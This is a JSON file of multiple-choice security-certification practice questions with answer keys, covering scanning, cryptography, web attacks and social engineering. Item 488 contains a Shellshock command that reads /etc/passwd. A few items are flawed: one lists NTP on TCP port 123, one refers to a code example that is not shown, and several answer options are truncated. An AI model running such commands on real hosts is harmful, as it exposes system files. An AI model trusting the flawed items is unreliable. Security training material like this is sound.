    "question": "In order to prevent collisions and protect password hashes from rainbow tables, Maria, the system administrator, decides to add random data strings to the end of passwords before hashing. What is the name of this technique?",
    "answers": [
      "Extra hashing",
      "Masking",
      "Stretching",
      "Salting"
    ],
    "correct": "Salting"
  },
  {
    "id": 425,
    "question": "Alex, a network administrator, received a warning from IDS about a possibly malicious sequence of packets sent to a Web server in the network's external DMZ. The packet traffic was captured by the IDS and saved to a PCAP file. Now Alex needs to determine if these packets are genuinely malicious or simply a false positive. Which of the following type of network tools will he use?",
    "answers": [
      "Vulnerability scanner.",
      "Intrusion Prevention System (IPS).",
      "Host-based intrusion prevention system (HIPS).",
      "Protocol analyzer."
    ],
    "correct": "Protocol analyzer."
  },
  {
    "id": 426,
    "question": "Alex works as a network administrator at ClassicUniversity. There are many Ethernet ports are available for professors and authorized visitors (but not for students) on the university campus. However, Alex realized that some students connect their notebooks to the wired network to have Internet access.  He identified this when the IDS alerted for malware activities in the network.  What should Alex do to avoid this problem?",
    "answers": [
      "Use the 802.1x protocol.",
      "Disable unused ports in the switches.",
      "Ask students to use the wireless network.",
      "Separate students in a different VLAN."
    ],
    "correct": "Use the 802.1x protocol."
  },
  {
    "id": 427,
    "question": "Which of the following services run on TCP port 123 by default?",
    "answers": [
      "DNS",
      "POP3",
      "Telnet",
      "NTP"
    ],
    "correct": "NTP"
  },
  {
    "id": 428,
    "question": "What flags will be set when scanning when using the following command: #nmap -sX host.companydomain.com",
    "answers": [
      "URG, PUSH and FIN are set.",
      "SYN and ACK flags are set.",
      "ACK flag is set.",
      "SYN flag is set."
    ],
    "correct": "URG, PUSH and FIN are set."
  },
  {
    "id": 429,
    "question": "Which of the following is a component of IPsec that performs protocol-level functions required to encrypt and decrypt the packets?",
    "answers": [
      "IPsec driver",
      "Internet Key Exchange (IKE)",
      "IPsec Policy Agent",
      "Oakley"
    ],
    "correct": "IPsec driver"
  },
  {
    "id": 430,
    "question": "John, a cybersecurity specialist, wants to perform a syn scan in his company's network. He has two machines. The first machine (192.168.0.98) has snort installed, and the second machine (192.168.0.151) has kiwi Syslog installed. When he started a syn scan in the network, he notices that kiwi Syslog is not receiving the alert message from snort. He decides to run Wireshark in the snort machine to check if the messages are going to the kiwi Syslog machine. What Wireshark filter will show the connections from the snort machine to kiwi Syslog machine?",
    "answers": [
      "tcp.dstport==514 && ip.dst==192.168.0.0/16",
      "tcp.dstport==514 && ip.dst==192.168.0.151",
      "tcp.srcport==514 && ip.src==192.168.0.98",
      "tcp.srcport==514 && ip.src==192.168.151"
    ],
    "correct": "tcp.dstport==514 && ip.dst==192.168.0.151"
  },
  {
    "id": 431,
    "question": "Having a sufficient database of passwords, you can use statistical analysis of the list of words, you can create a very effective way to crack passwords for such tools as, for example, John The Ripper. Which of the attacks uses such an analysis to calculate the probability of placing characters in a quasi-brute attack?",
    "answers": [
      "Fingerprint",
      "Prince",
      "Toggle-Case",
      "Markov Chain"
    ],
    "correct": "Markov Chain"
  },
  {
    "id": 432,
    "question": "Which characteristic is most likely not to be used by companies in biometric control for use on the company's territory?",
    "answers": [
      "Fingerprints",
      "Height/Weight",
      "Voice",
      "Iris patterns"
    ],
    "correct": "Height/Weight"
  },
  {
    "id": 433,
    "question": "Which of the following types of keys does the Heartbleed bug expose to the Internet, making exploiting any compromised system very easy?",
    "answers": [
      "Root",
      "Private",
      "Public",
      "Shared"
    ],
    "correct": "Private"
  },
  {
    "id": 434,
    "question": "Buffer overflow mainly occurs when a created memory partition (or buffer) is written beyond its intended boundaries. If an attacker manages to do this from outside the program, this can cause security problems since it can potentially allow them to manipulate arbitrary memory cells, although many modern operating systems protect against the worst cases of this. What programming language is this example in? ",
    "answers": [
      "C",
      "HTML",
      "Java",
      "SQL"
    ],
    "correct": "C"
  },
  {
    "id": 435,
    "question": "ISAPI filters is a powerful tool that is used to extend the functionality of IIS. However, improper use can cause huge harm. Why do EC-Council experts recommend that security analysts monitor the disabling of unused ISAPI filters?",
    "answers": [
      "To prevent leaks of confidential data",
      "To defend against webserver attacks",
      "To prevent memory leaks",
      "To defend against wireless attacks"
    ],
    "correct": "To defend against webserver attacks"
  },
  {
    "id": 436,
    "question": "The company is trying to prevent the security breach by applying a security policy in which all Web browsers must automatically delete their HTTP browser cookies upon termination. Identify the security breach that the company is trying to prevent?",
    "answers": [
      "Attempts by attackers to access passwords stored on the employee's computer.",
      "Attempts by attackers to determine the employee's web browser usage patterns.",
      "Attempts by attackers to access websites that trust the Web browser user by stealing the employee's authentication credentials.",
      "Attempts by attackers to access the user and password information stored in the company's SQL database."
    ],
    "correct": "Attempts by attackers to access websites that trust the Web browser user by stealing the employee's authentication credentials."
  },
  {
    "id": 437,
    "question": "One of the most popular tools in the pentester's arsenal - John the Ripper is designed for...",
    "answers": [
      "Automation of the process of detecting and exploiting the SQL injection vulnerability.",
      "Test password strength, brute-force encrypted or hashed passwords, and crack passwords via dictionary attacks.",
      "Discover hosts and services on a computer network by sending packets and analyzing the responses.",
      "Search for various default and insecure files, configurations, and programs on any type of web servers."
    ],
    "correct": "Test password strength, brute-force encrypted or hashed passwords, and crack passwords via dictionary attacks."
  },
  {
    "id": 438,
    "question": "Which of the following Linux-based tools will help you change any user's password or activate disabled accounts if you have physical access to a Windows 2008 R2 and an Ubuntu 9.10 Linux LiveCD?",
    "answers": [
      "CHNTPW",
      "SET",
      "Cain & Abel",
      "John the Ripper"
    ],
    "correct": "CHNTPW"
  },
  {
    "id": 439,
    "question": "What is the minimum number of network connections needed for a multi-homed firewall?",
    "answers": [
      "3",
      "2",
      "5",
      "4"
    ],
    "correct": "2"
  },
  {
    "id": 440,
    "question": "Implementing the security testing process early in the SDLC is the key to finding out and fixing the security bugs early in the SDLC lifecycle. The security testing process can be performed in two ways, Automated or Manual web application security testing. Which of the proposed statements is true?",
    "answers": [
      "Manual testing is obsolete and should be completely replaced by automatic testing.",
      "Automatic and manual testing should be used together to better cover potential problems.",
      "Neural networks and artificial intelligence are already used in new tools and do not require additional actions.",
      "Automatic testing requires a lot of money and is still very imperfect, so it cannot be used for security."
    ],
    "correct": "Automatic and manual testing should be used together to better cover potential problems."
  },
  {
    "id": 441,
    "question": "There are different ways of pentest of a system, network, or application in information security based on how much information you have about the target. There's black box testing, white box testing, and gray box testing. Which of the statements is true about grey-box testing?",
    "answers": [
      "The tester is unaware of the internal structure.",
      "The tester has full access to the internal structure.",
      "The tester only partially knows the internal structure.",
      "The tester does not have access at all."
    ],
    "correct": "The tester only partially knows the internal structure."
  },
  {
    "id": 442,
    "question": "What is the first and most important phase that is the starting point for penetration testing in the work of an ethical hacker?",
    "answers": [
      "Scanning",
      "Maintaining Access",
      "Reconnaissance",
      "Gaining Access"
    ],
    "correct": "Reconnaissance"
  },
  {
    "id": 443,
    "question": "In which phase of the ethical hacking process can Google hacking be used? For example: allintitle: root passwd",
    "answers": [
      "Reconnaissance",
      "Scanning and Enumeration",
      "Gaining Access",
      "Maintaining Access"
    ],
    "correct": "Reconnaissance"
  },
  {
    "id": 444,
    "question": "You need to conduct a technical assessment of the network for a small company that supplies medical services. All computers in the company use Windows OS. What is the best approach for discovering vulnerabilities?",
    "answers": [
      "Use the built-in Windows Update tool.",
      "Use a scan tool like Nessus.",
      "Create a disk image of a clean Windows installation.",
      "Check MITRE.org for the latest list of CVE findings."
    ],
    "correct": "Use a scan tool like Nessus."
  },
  {
    "id": 445,
    "question": "What is the name of the risk assessment method that allows you to study how various types of negative events (violations, failures or destructions) can affect the main activities of the company and key business processes?",
    "answers": [
      "Disaster Recovery Planning (DRP)",
      "Emergency Plan Response (EPR)",
      "Business Impact Analysis (BIA)",
      "Risk Mitigation"
    ],
    "correct": "Business Impact Analysis (BIA)"
  },
  {
    "id": 446,
    "question": "After scanning the ports on the target machine, you see a list of open ports, which seems unusual to you:  Starting NMAP 5.21 at 2019-06-18 12:32  NMAP scan report for 172.19.40.112  Host is up (1.00s latency).  Not shown: 993 closed ports  PORT      STATE    SERVICE  21/tcp    open     ftp  23/tcp    open     telnet  80/tcp    open     http  139/tcp   open     netbios-ssn  515/tcp   open  631/tcp   open     ipp  9100/tcp  open  MAC Address:  00:00:5D:3F:EE:92 Based on the NMAP output, identify what is most likely this host?",
    "answers": [
      "The host is likely a Windows machine.",
      "The host is likely a router.",
      "The host is likely a printer.",
      "The host is likely a Linux machine."
    ],
    "correct": "The host is likely a printer."
  },
  {
    "id": 447,
    "question": "The ping utility is used to check the integrity and quality of connections in networks. In the process, it sends an ICMP Echo-Request and captures the incoming ICMP Echo- Reply, but quite often remote nodes block or ignore ICMP. Which of the options will solve this problem?",
    "answers": [
      "Use arping",
      "Use traceroute",
      "Use hping",
      "Use broadcast ping"
    ],
    "correct": "Use hping"
  },
  {
    "id": 448,
    "question": "The SOC analyst of the company wants to track the transfer of files over the unencrypted FTP protocol, which filter for the Wireshark sniffer should he use?",
    "answers": [
      "tcp.port ==21",
      "tcp.port == 80",
      "tcp.port == 443",
      "tcp.port = 23"
    ],
    "correct": "tcp.port ==21"
  },
  {
    "id": 449,
    "question": "Black-hat hacker Ivan created a fraudulent website to steal users' credentials. What of the proposed tasks does he need to perform so that users are redirected to a fake one when entering the domain name of a real site?",
    "answers": [
      "SMS phishing",
      "DNS spoofing",
      "ARP Poisoning",
      "MAC Flooding"
    ],
    "correct": "DNS spoofing"
  },
  {
    "id": 450,
    "question": "Identify the type of DNS configuration in which first DNS server on the internal network and second DNS in DMZ?",
    "answers": [
      "Split DNS",
      "DNSSEC",
      "EDNS",
      "DynDNS"
    ],
    "correct": "Split DNS"
  },
  {
    "id": 451,
    "question": "Identify a tool that can be used for passive OS fingerprinting?",
    "answers": [
      "ping",
      "tracert",
      "tcpdump",
      "nmap"
    ],
    "correct": "tcpdump"
  },
  {
    "id": 452,
    "question": "Rajesh, a black-hat hacker, could not find vulnerabilities in the target company's network since their infrastructure is very well protected. IDS, firewall with strict rules, etc. He is trying to find such an attack method independent of the reliability of the infrastructure of this company. Which attack is an option suitable for Rajesh?",
    "answers": [
      "Social Engineering",
      "Confidence trick",
      "Denial-of-Service",
      "Buffer Overflow"
    ],
    "correct": "Social Engineering"
  },
  {
    "id": 453,
    "question": "Lisandro is engaged in sending spam. To avoid blocking, he connects to incorrectly configured SMTP servers that allow e-mail relay without authentication (which allows Lisandro to fake information about the sender's identity). What is the name of such an SMTP server?",
    "answers": [
      "Public SMTP server.",
      "Open mail relay.",
      "Message transfer agent.",
      "Weak SMTP."
    ],
    "correct": "Open mail relay."
  },
  {
    "id": 454,
    "question": "The fraudster Lisandro, masquerading as a large car manufacturing company recruiter, massively sends out job offers via e-mail with the promise of a good salary, a friendly team, unlimited coffee, and medical insurance. He attaches Microsoft Word or Excel documents to his letters into which he embeds a special virus written in Visual Basic that runs when the document is opened and infects the victim's computer. What type of virus does Lisandro use?",
    "answers": [
      "Polymorphic code",
      "Stealth virus",
      "Multipart virus",
      "Macro virus"
    ],
    "correct": "Macro virus"
  },
  {
    "id": 455,
    "question": "Identify the type of partial breaks in which the attacker discovers a functionally equivalent algorithm for encryption and decryption, but without learning the key?",
    "answers": [
      "Instance deduction.",
      "Information deduction.",
      "Total break.",
      "Global deduction."
    ],
    "correct": "Global deduction."
  },
  {
    "id": 456,
    "question": "John received this text message: \"Hello, this is Jack Smith from the Gmail customer service. Kindly contact me about problems with your account: jacksmith@gmail.com\". Which statement below is true?",
    "answers": [
      "John should write to  jacksmith@gmail.com to verify the identity of Jack.",
      "This is probably a legitimate message as it comes from a respectable",
      "This is a scam because John does not know Jack.",
      "This is a scam as everybody can get a @gmail.com address, not the Gmail"
    ],
    "correct": "This is a scam as everybody can get a @gmail.com address, not the Gmail"
  },
  {
    "id": 457,
    "question": "Black-hat hacker Ivan wants to determine the status of ports on a remote host. He wants to do this quickly but imperceptibly for IDS systems. For this, he uses a half-open scan that doesn\u2019t complete the TCP three-way handshake. What kind of scanning does Ivan use?",
    "answers": [
      "TCP SYN (Stealth) Scan",
      "FIN scan",
      "PSH Scan",
      "XMAS scans"
    ],
    "correct": "TCP SYN (Stealth) Scan"
  },
  {
    "id": 458,
    "question": "Which of the following is a Denial-of-service vulnerability for which security patches have not yet been released, or there is no effective means of protection?",
    "answers": [
      "Yo-yo",
      "Smurf",
      "APDoS",
      "Zero-Day"
    ],
    "correct": "Zero-Day"
  },
  {
    "id": 459,
    "question": "Lisandro is a novice fraudster, he uses special software purchased in the depths of the network for sending his malware. This program allows it to deceive pattern-based detection mechanisms and even some behavior-based ones, disguising malwares as harmless programs. What does Lisandro use?",
    "answers": [
      "Payload",
      "Ransomware",
      "Dropper",
      "Crypter"
    ],
    "correct": "Crypter"
  },
  {
    "id": 460,
    "question": "The evil hacker Ivan wants to attack the popular air ticket sales service. After careful study, he discovered that the web application is vulnerable to introduced malicious JavaScript code through the application form. This code does not cause any harm to the server itself, but when executed on the client's computer, it can steal his personal data. What kind of attack is Ivan preparing to use?",
    "answers": [
      "XSS",
      "LDAP Injection",
      "SQL injection",
      "CSRF"
    ],
    "correct": "XSS"
  },
  {
    "id": 461,
    "question": "Maria, the leader of the Blue Team, wants to use network traffic analysis to implement the ability to detect an intrusion in her network of several hosts quickly. Which tool is best suited to perform this task?",
    "answers": [
      "NIDS",
      "Firewalls",
      "HIDS",
      "Honeypot"
    ],
    "correct": "NIDS"
  },
  {
    "id": 462,
    "question": "Jack needs to analyze the files produced by several packet-capture programs such as Wireshark, tcpdump, EtherPeek and WinDump. Which of the following tools will Jack use?",
    "answers": [
      "Nessus",
      "tcptraceroute",
      "tcptrace",
      "OpenVAS"
    ],
    "correct": "tcptrace"
  },
  {
    "id": 463,
    "question": "What Linux command will you use to resolve a domain name into an IP address?",
    "answers": [
      "host -t ns resolveddomain.com",
      "host -t a resolveddomain.com",
      "host -t AXFR resolveddomain.com",
      "host -t soa resolveddomain.com"
    ],
    "correct": "host -t a resolveddomain.com"
  },
  {
    "id": 464,
    "question": "Your company regularly conducts backups of critical servers but cannot afford them to be sent off-site vendors for long-term storage and archiving. The company found a temporary solution in the form of storing backups in the company's safe. During the next audit, there was a risk associated with the fact that backup storages are not stored off-site. The company manager has a plan to take the backup storages home with him and wants to know what two things he can do to secure the backup tapes while in transit?",
    "answers": [
      "Encrypt the backup tapes and transport them in a lockbox.",
      "Hash the backup tapes and transport them in a lockbox.",
      "Degauss the backup tapes and transport them in a lockbox.",
      "Encrypt the backup tapes and use a courier to transport them."
    ],
    "correct": "Encrypt the backup tapes and transport them in a lockbox."
  },
  {
    "id": 465,
    "question": "Jenny, a pentester, conducts events to detect viruses in systems. She uses a detection method where the anti-virus executes the malicious codes on a virtual machine to simulate CPU and memory activities. Which of the following methods does Jenny use?",
    "answers": [
      "Integrity checking.",
      "Vulnerability scanner.",
      "Heuristic Analysis.",
      "Code Emulation."
    ],
    "correct": "Code Emulation."
  },
  {
    "id": 466,
    "question": "The Domain Name System (DNS) is the phonebook of the Internet. When a user tries to access a web address like \u201cexample.com\u201d, web browser or application performs a DNS Query against a DNS server, supplying the hostname. The DNS server takes the hostname and resolves it into a numeric IP address, which the web browser can connect to. Which of the proposed tools allows you to set different DNS query types and poll arbitrarily specified servers?",
    "answers": [
      "Wireshark",
      "Nikto",
      "Nslookup",
      "Metasploit"
    ],
    "correct": "Nslookup"
  },
  {
    "id": 467,
    "question": "An attacker stole financial information from a bank by compromising only a single server. After that, the bank decided to hire a third-party organization to conduct a full security assessment. Cybersecurity specialists have been provided with information about this case, and they need to provide an initial recommendation. Which of the following will be the best recommendation?",
    "answers": [
      "Issue new certificates to the web servers from the root certificate authority.",
      "Move the financial data to another server on the same IP subnet.",
      "Require all employees to change their passwords immediately.",
      "Place a front-end web server in a demilitarized zone that only handles external web traffic."
    ],
    "correct": "Place a front-end web server in a demilitarized zone that only handles external web traffic."
  },
  {
    "id": 468,
    "question": "The attacker managed to gain access to Shellshock, and now he can execute arbitrary commands and gain unauthorized access to many Internet-facing services. Which of the following operating system can't be affected by an attacker yet?",
    "answers": [
      "Windows",
      "OS X",
      "Linux",
      "Unix"
    ],
    "correct": "Windows"
  },
  {
    "id": 469,
    "question": "Due to the network slowdown, the IT department decided to monitor the Internet traffic of all employees to track a possible cause, but they can't do it immediately. Which of the following is troublesome to take this kind of measure from a legal point of view?",
    "answers": [
      "Not informing the employees that they are going to be monitored could be an invasion of privacy.",
      "All of the employees would stop normal work activities.",
      "Lack of comfortable working conditions.",
      "The absence of an official responsible for traffic on the network."
    ],
    "correct": "Not informing the employees that they are going to be monitored could be an invasion of privacy."
  },
  {
    "id": 470,
    "question": "Which of the following is most useful for quickly checking for SQL injection vulnerability by sending a special character to web applications?",
    "answers": [
      "Semicolon",
      "Double quotation",
      "Single quotation",
      "Backslash"
    ],
    "correct": "Single quotation"
  },
  {
    "id": 471,
    "question": "Which of the following is true about the AES and RSA encryption algorithms?",
    "answers": [
      "AES is asymmetric, which is used to create a public/private key pair; RSA is symmetric, which is used to encrypt data.",
      "Both are symmetric algorithms, but AES uses 256-bit keys.",
      "RSA is asymmetric, which is used to create a public/private key pair; AES is symmetric, which is used to encrypt data.",
      "Both are asymmetric algorithms, but RSA uses 1024-bit keys."
    ],
    "correct": "RSA is asymmetric, which is used to create a public/private key pair; AES is symmetric, which is used to encrypt data."
  },
  {
    "id": 472,
    "question": "While performing online banking using a browser, your friend receives a message that contains a link to a website. He decides to click on this link, and another browser session starts and displays a funny video. A few hours later, he receives a letter from the bank stating that his online bank was visited from another country and tried to transfer money. The bank also asks him to contact them and confirm the transfer if he really made it. What vulnerability did the attacker use when attacking your friend?",
    "answers": [
      "Cross-Site Request Forgery",
      "Clickjacking",
      "Webform input validation",
      "Cross-Site Scripting"
    ],
    "correct": "Cross-Site Request Forgery"
  },
  {
    "id": 473,
    "question": "A digital signature is the digital equivalent of a handwritten signature or stamped seal. It is intended to solve the problem of tampering and impersonation in digital communications. Which of the following option does a digital signature NOT provide?",
    "answers": [
      "Confidentiality",
      "Authentication",
      "Non-repudiation",
      "Integrity"
    ],
    "correct": "Confidentiality"
  },
  {
    "id": 474,
    "question": "NIST defines risk management as the process of identifying, assessing, and controlling threats to an organization's capital and earnings. But what is the \"risk\" itself?",
    "answers": [
      "Potential that a threat will exploit vulnerabilities of an asset or group of assets.",
      "An occurrence that actually or potentially jeopardizes the confidentiality,",
      "The unauthorized disclosure, modification, or use of sensitive data.",
      "Weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source."
    ],
    "correct": "Potential that a threat will exploit vulnerabilities of an asset or group of assets."
  },
  {
    "id": 475,
    "question": "Identify a low-tech way of gaining unauthorized access to information?",
    "answers": [
      "Social engineering",
      "Sniffing",
      "Eavesdropping",
      "Scanning"
    ],
    "correct": "Social engineering"
  },
  {
    "id": 476,
    "question": "Which of the following documents describes the specifics of the testing, the associated violations and essentially protects both the organization's interest and third-party penetration tester?",
    "answers": [
      "Rules of Engagement",
      "Project Scope",
      "Service Level Agreement",
      "Non-Disclosure Agreement"
    ],
    "correct": "Rules of Engagement"
  },
  {
    "id": 477,
    "question": "When choosing a biometric system for your company, you should take into account the factors of system performance and whether they are suitable for you or not. What determines such a factor as the throughput rate?",
    "answers": [
      "The probability that the system fails to detect a biometric input when presented correctly.",
      "The probability that the system incorrectly matches the input pattern to a non-",
      "The maximum number of sets of data that can be stored in the system.",
      "The data collection speeds, data processing speed, or enrolment time."
    ],
    "correct": "The data collection speeds, data processing speed, or enrolment time."
  },
  {
    "id": 478,
    "question": "Which mode of a NIC (interface) allows you to intercept and read each network packet that arrives in its entirety?",
    "answers": [
      "Multicast",
      "Port forwarding",
      "Simplex Mode",
      "Promiscuous mode"
    ],
    "correct": "Promiscuous mode"
  },
  {
    "id": 479,
    "question": "Identify a security policy that defines using of a VPN  for gaining access to an internal corporate network?",
    "answers": [
      "Information protection policy",
      "Remote access policy",
      "Access control policy",
      "Network security policy"
    ],
    "correct": "Remote access policy"
  },
  {
    "id": 480,
    "question": "IPsec is a suite of protocols developed to ensure the integrity, confidentiality, and authentication of data communications over an IP network. Which protocol is NOT included in the IPsec suite?",
    "answers": [
      "Security Association (SA)",
      "Authentication Header (AH)",
      "Media Access Control (MAC)",
      "Encapsulating Security Protocol (ESP)"
    ],
    "correct": "Media Access Control (MAC)"
  },
  {
    "id": 481,
    "question": "Which of the following is an access control mechanism that allows multiple systems to use a CAS that permits users to authenticate once and gain access to multiple systems?",
    "answers": [
      "Single sign-on",
      "Role-Based Access Control (RBAC)",
      "Discretionary Access Control (DAC)",
      "Mandatory access control (MAC)"
    ],
    "correct": "Single sign-on"
  },
  {
    "id": 482,
    "question": "Assume an attacker gained access to the internal network of a small company and launches a successful STP manipulation attack. What are his next steps?",
    "answers": [
      "He will repeat the same attack against all L2 switches of the network.",
      "He will create a SPAN entry on the spoofed root bridge and redirect traffic to his computer.",
      "He will repeat this action so that it escalates to a DoS attack.",
      "He will activate OSPF on the spoofed root bridge."
    ],
    "correct": "He will create a SPAN entry on the spoofed root bridge and redirect traffic to his computer."
  },
  {
    "id": 483,
    "question": "Which of the following is the type of message that sends the client to the server to begin a 3-way handshake while establishing a TCP connection?",
    "answers": [
      "ACK",
      "SYN",
      "SYN-ACK",
      "RST"
    ],
    "correct": "SYN"
  },
  {
    "id": 484,
    "question": "Transmission Control Protocol accepts data from a data stream, divides it into chunks, and adds a TCP header creating a TCP segment. A TCP segment consists of a segment header and a data section. The segment header contains 10 mandatory fields and an optional extension field. Which of the suggested fields is not included in the TCP segment header?",
    "answers": [
      "Sequence Number",
      "Source Port",
      "Source IP address",
      "Checksum"
    ],
    "correct": "Source IP address"
  },
  {
    "id": 485,
    "question": "Identify the structure designed to verify and authenticate the identity of individuals within the enterprise taking part in a data exchange?",
    "answers": [
      "biometrics",
      "PKI",
      "single sign-on",
      "SOA"
    ],
    "correct": "PKI"
  },
  {
    "id": 486,
    "question": "The absolute majority of routers and switches use packet filtering firewalls. That kind of firewalls makes decisions about allowing traffic to pass into the network based on the information contained in the packet header. At what level of the OSI model do these firewalls work?",
    "answers": [
      "Network layer",
      "Physical layer",
      "Session layer",
      "Application layer"
    ],
    "correct": "Network layer"
  },
  {
    "id": 487,
    "question": "Identify the algorithm according to the following description: That wireless security algorithm was rendered useless by capturing packets and discovering the passkey in seconds. This vulnerability was strongly affected to TJ Maxx company. This vulnerability led to a network invasion of the company and data theft through a technique known as wardriving.",
    "answers": [
      "Wi-Fi Protected Access 2 (WPA2)",
      "Temporal Key Integrity Protocol (TKIP)",
      "Wired Equivalent Privacy (WEP)",
      "Wi-Fi Protected Access (WPA)"
    ],
    "correct": "Wired Equivalent Privacy (WEP)"
  },
  {
    "id": 488,
    "question": "Shellshock is a serious bug in the Bash command-line interface shell that allows an attacker to execute commands by gaining unauthorized access to computer systems. env x=`(){ :;};echo exploit` bash -c 'cat /etc/passwd' What is the result of executing this query on a vulnerable host?",
    "answers": [
      "Copying the contents of the passwd file",
      "Creating a passwd file.",
      "Display of the contents of the passwd file.",
      "Deleting the passwd file."
    ],
    "correct": "Display of the contents of the passwd file."
  },
  {
    "id": 489,
    "question": "Identify a component of a risk assessment?",
    "answers": [
      "DMZ",
      "Physical security",
      "Logical interface",
      "Administrative safeguards"
    ],
    "correct": "Administrative safeguards"
  },
  {
    "id": 490,
    "question": "In what type of attack does the attacker forge the sender's IP address to gain access to protected systems and confidential data?",
    "answers": [
      "Source Routing",
      "IP Spoofing",
      "IP forwarding",
      "IP fragmentation attack"
    ],
    "correct": "IP Spoofing"
  },
  {
    "id": 491,
    "question": "Alex, a cybersecurity science student, needs to fill in the information into a secured PDF- file job application received from a prospective employer. He can't enter the information because all the fields are blocked. He doesn't want to request a new document that allows the forms to be completed and decides to write a script that pulls passwords from a list of commonly used passwords to try against the secured PDF until the correct password is found or the list is exhausted. Which attack is the student attempting?",
    "answers": [
      "Brute-force attack",
      "Dictionary-attack",
      "Man-in-the-middle attack",
      "Session hijacking"
    ],
    "correct": "Dictionary-attack"
  },
  {
    "id": 492,
    "question": "Victims of DoS attacks often are web servers of high-profile organizations such as banking, commerce, media companies, or government and trade organizations. Which of the following symptom could indicate a DoS or DDoS attack?",
    "answers": [
      "An inability to access any website",
      "Unknown programs running on your system.",
      "Damage and corrupt files.",
      "Misbehaviour of computer programs and application."
    ],
    "correct": "An inability to access any website"
  },
  {
    "id": 493,
    "question": "Which of the following is a common IDS evasion technique?",
    "answers": [
      "Port knocking",
      "Spyware",
      "Unicode characters",
      "Subnetting"
    ],
    "correct": "Unicode characters"
  },
  {
    "id": 494,
    "question": "An attacker tries to infect as many devices connected to the Internet with malware as possible to get the opportunity to use their computing power and functionality for automated attacks hidden from the owners of these devices. Which of the proposed approaches fits description of the attacker's actions?",
    "answers": [
      "Creating a botnet",
      "Using Banking Trojans",
      "APT attack",
      "Mass distribution of Ransomware"
    ],
    "correct": "Creating a botnet"
  },
  {
    "id": 495,
    "question": "The network elements of the telecom operator are located in the data center under the protection of firewalls and intrusion prevention systems. Which of the following is true for additional security measures?",
    "answers": [
      "Periodic security checks and audits are required. Access to network elements should be provided by user IDs with strong passwords.",
      "No additional measures are required, since the attacker does not have physical access to the data center equipment.",
      "Firewalls and intrusion detection systems are sufficient to ensure complete security.",
      "No additional measures are required since attacks and downtime are inevitable, and a backup site is required."
    ],
    "correct": "Periodic security checks and audits are required. Access to network elements should be provided by user IDs with strong passwords."
  },
  {
    "id": 496,
    "question": "Monitoring your company\u2019s assets is one of the most important jobs you can perform. What warnings should you try to reduce when configuring security tools, such as security information and event management (SIEM) solutions or intrusion detection systems (IDS)?",
    "answers": [
      "Only False Positives",
      "False Positives and False Negatives",
      "True Positives and True Negatives",
      "Only True Negatives"
    ],
    "correct": "False Positives and False Negatives"
  },
  {
    "id": 497,
    "question": "To send an email using SMTP protocol which does not encrypt messages and leaving the information vulnerable to being read by an unauthorized person. To solve this problem, SMTP can upgrade a connection between two mail servers to use TLS, and the transmitted emails will be encrypted. Which of the following commands is used by SMTP to transmit email over TLS?",
    "answers": [
      "UPGRADETLS",
      "OPPORTUNISTICTLS",
      "STARTTLS",
      "FORCETLS"
    ],
    "correct": "STARTTLS"
  },
  {
    "id": 498,
    "question": "Identify the type of attack according to the following scenario: Ivan, a black-hat hacker, initiates an attack on a certain organization. In preparation for this attack, he identified a well-known and trust website that employees of this company often use. In the next step, Ivan embeds an exploit into the website that infects the target systems of employees when using the website. After this preparation, he can only wait for the successful execution of his attack.",
    "answers": [
      "Heartbleed",
      "Spear Phishing",
      "Watering Hole",
      "Shellshock"
    ],
    "correct": "Watering Hole"
  },
  {
    "id": 499,
    "question": "Confidential information is stored and processed on your company's servers, however, auditing has never been enabled. What of the following should be done before enabling the audit feature?",
    "answers": [
      "Determine the impact of enabling the audit feature.",
      "Allocate funds for staffing of audit log review.",
      "Perform a vulnerability scan of the system.",
      "Perform a cost/benefit analysis of the audit feature."
    ],
    "correct": "Determine the impact of enabling the audit feature."
  },
  {
    "id": 500,
    "question": "John needs to send a super-secret message, and for this, he wants to use the technique of hiding a secret message within an ordinary message. The technique provides \"security through obscurity.\" Which of the following techniques will John use?",
    "answers": [
      "Steganography",
      "Deniable encryption",
      "Digital watermarking",
      "Encryption"
    ],
    "correct": "Steganography"
  },
]
